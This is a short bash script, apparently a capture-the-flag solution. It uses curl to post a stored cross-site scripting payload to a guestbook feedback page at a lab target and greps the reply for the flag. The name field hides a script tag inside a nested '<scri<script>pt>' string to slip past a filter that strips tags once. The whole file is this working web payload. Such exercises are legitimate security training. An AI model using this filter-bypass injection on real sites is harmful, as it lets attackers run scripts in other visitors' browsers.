#!/bin/bash
curl "http://$IP/?page=feedback" --data "txtName=<scri<script>pt>&mtxtMessage=alert();&btnSign=Sign+Guestbook" | grep -i flag
